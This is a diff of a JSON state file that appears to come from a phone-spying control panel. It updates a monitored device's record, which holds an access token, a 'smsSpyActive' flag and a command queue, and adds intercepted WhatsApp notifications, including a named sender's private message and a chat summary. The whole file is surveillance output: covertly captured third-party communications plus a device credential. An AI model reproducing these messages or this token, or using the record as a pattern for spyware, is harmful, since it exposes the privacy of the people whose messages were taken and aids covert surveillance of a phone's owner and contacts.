@@ -4,7 +4,7 @@
     "deviceName": "HP-PEW-3BFE",
     "ownerUsername": "Youbie",
     "token": "74be2827eaa044a7872739b517404413",
-    "lastSeen": 1776762792801,
+    "lastSeen": 1776762796289,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-21T08:57:06.800Z",
@@ -20,6 +20,22 @@
     "lastScreenFrame": null,
     "smsSpyActive": true,
     "smsMessages": [
+      {
+        "appName": "WhatsApp",
+        "sender": "Kelvin",
+        "content": "Ada kgk?",
+        "time": "21/04 17:13",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1776762797082
+      },
+      {
+        "appName": "WhatsApp",
+        "sender": "WhatsApp",
+        "content": "‎‎50 pesan dari 26 chat",
+        "time": "21/04 17:13",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1776762793353
+      },
       {
         "appName": "WhatsApp",
         "sender": "‎HK-dept KPP-INDE/KHVR (9 pesan): Fatar Hk",
